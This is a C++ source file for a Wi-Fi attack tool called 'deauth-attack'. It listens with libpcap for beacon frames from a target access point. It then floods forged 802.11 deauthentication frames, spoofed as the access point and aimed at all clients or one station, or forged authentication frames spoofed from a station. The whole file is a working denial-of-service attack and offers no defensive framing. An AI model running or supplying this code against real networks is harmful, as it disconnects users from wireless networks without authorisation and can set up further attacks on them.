#include <pcap.h>
#include <stdbool.h>
#include <stdio.h>
#include <thread>
#include <stdlib.h>
#include <unistd.h>
#include <algorithm>
#include <regex>
#include <iostream>
#include <sstream>
#include <vector>
#include "wireless.h"


void usage() {
    printf("syntax: deauth-attack <interface> <ap mac> [<station mac>] [-auth]\n");
    printf("sample: deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

typedef struct {
	char* dev_;
    char* ap_;
    char* station_;
    bool auth_;
} Param;

Param param  = {
    .dev_ = NULL,
    .ap_ = NULL,
    .station_ = NULL,
    .auth_ = false
};

bool parse(Param* param, int argc, char* argv[]) {
    if (argc < 3) {
		usage();
		return false;
    }
    param->dev_ = argv[1];
    std::regex re("[A-Fa-f0-9]{2}:[A-Fa-f0-9]{2}:[A-Fa-f0-9]{2}:[A-Fa-f0-9]{2}:[A-Fa-f0-9]{2}:[A-Fa-f0-9]{2}");
    if(std::regex_match(argv[2], re)){
        param->ap_ = argv[2];
    } else {
        usage();
        return false;
    }
    if (argc == 3) return true;
    else if (argc == 4) {
        if (strncmp(argv[3], "-auth", 5) == 0){
            param->auth_ = true;
            return true;
        } else if (std::regex_match(argv[3], re)) {
            param->station_ = argv[3];
            return true;
        }
    } else if (argc == 5){
        if (strncmp(argv[4], "-auth", 5) == 0 && std::regex_match(argv[3], re)){
            param->auth_ = true;
            param->station_ = argv[3];
            return true;
        }
    }
    usage();
    return false;
}

 int channel_hop(char *interface, std::vector<int> channels){
    std::string cmd;
    cmd = cmd + "sudo iwconfig " + std::string(interface) + " channel ";
    std::string cmd_with_channels;
    int i=0;
    if (channels.size() % 5 == 0){
        channels.push_back(1);
    }
    while(1){
        cmd_with_channels = cmd + std::to_string(channels[i]);
        system(cmd_with_channels.c_str());
        i += 5;
        if(i % channels.size() == 0) i=0;
        usleep(10000000);
    }
}

std::string getResultFromCommand(std::string cmd){
    std::string result;
    FILE* stream;
    const int maxBuffer = 256;
    char buffer[maxBuffer];
    cmd.append(" 2>&1");

    stream = popen(cmd.c_str(), "r");
    if(stream){
        while(fgets(buffer, maxBuffer, stream) != NULL){
            result += buffer;
        }
    }
    pclose(stream);
    return result;
}

std::vector<int> getChannels(std::string input){
    std::string delimiter = "Channel ";
    int pos = 0;
    int npos = 0;
    std::vector<int> result;
    std::string token;
    while((pos = input.find(delimiter)) != -1){
        token = input.substr(0, pos);
        input.erase(0, pos + delimiter.length());
        if((npos = input.find(" : ")) != -1){
            result.push_back(std::stoi(input.substr(0, npos)));
        }
    }
    return result;
}


int main(int argc, char* argv[]) {
	if (!parse(&param, argc, argv))
		return -1;

	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
		return -1;
	}

    /*std::string cmd;
    cmd = cmd + "sudo iwlist " + std::string(param.dev_) + " channel";
    std::vector<int> channels = getChannels(getResultFromCommand(cmd));     //get channel

    std::thread t1(channel_hop, param.dev_, channels);      //channel hopping
    t1.detach();*/

    PRadiotabHdr radio;
    PDot11Hdr dot11;

    if(!param.auth_){                           // deauth attack
        SimpleRadiotapHdr deauthRadio;
        DeauthDot11Hdr deauthDot11;
        deauthDot11.bssid_ = Mac(param.ap_);
        deauthDot11.source_ = Mac(param.ap_);
        if(param.station_){
            deauthDot11.destination_ = Mac(param.station_);
        }
        uint len = sizeof(SimpleRadiotapHdr) + sizeof(DeauthDot11Hdr);
        u_char* tmp = new u_char[len];

        memcpy(tmp, &deauthRadio, sizeof(SimpleRadiotapHdr));
        memcpy(tmp + sizeof(SimpleRadiotapHdr), &deauthDot11, sizeof(DeauthDot11Hdr));

        while (true) {
            struct pcap_pkthdr* header;
            const u_char* packet;
            int res = pcap_next_ex(pcap, &header, &packet);
            if (res == 0) continue;
            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
                break;
            }
            radio = (PRadiotabHdr)packet;
            packet += radio->hlen();
            dot11 = (PDot11Hdr)packet;
            if(dot11->type_ == 0b00 && dot11->subtype_ == 0b1000 && dot11->bssid() == Mac(param.ap_)){          //beacon frame
                for(int i=0;i<5;i++){
                int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(tmp), len);
                    if (res != 0) {
                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
                    }
                }
            }
        }
        delete[] tmp;

    } else {                                // auth attack
        SimpleRadiotapHdr authRadio;
        AuthDot11Hdr authDot11;
        uint len = sizeof(SimpleRadiotapHdr) + sizeof(AuthDot11Hdr);
        u_char* tmp = new u_char[len];
        authDot11.bssid_ = Mac(param.ap_);
        authDot11.destination_ = Mac(param.ap_);
        authDot11.source_ = Mac(param.station_);

        memcpy(tmp, &authRadio, sizeof(SimpleRadiotapHdr));
        memcpy(tmp + sizeof(SimpleRadiotapHdr), &authDot11, sizeof(AuthDot11Hdr));

        while (true) {
            struct pcap_pkthdr* header;
            const u_char* packet;
            int res = pcap_next_ex(pcap, &header, &packet);
            if (res == 0) continue;
            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
                break;
            }
            radio = (PRadiotabHdr)packet;
            packet += radio->hlen();
            dot11 = (PDot11Hdr)packet;
            if(dot11->type_ == 0b00 && dot11->subtype_ == 0b1000 && dot11->bssid() == Mac(param.ap_)) { // beacon frame
                for(int i=0;i<2;i++){
                    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(tmp), len);
                    if (res != 0) {
                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
                    }
                }
            }
        }
        delete[] tmp;
    }
    pcap_close(pcap);
}
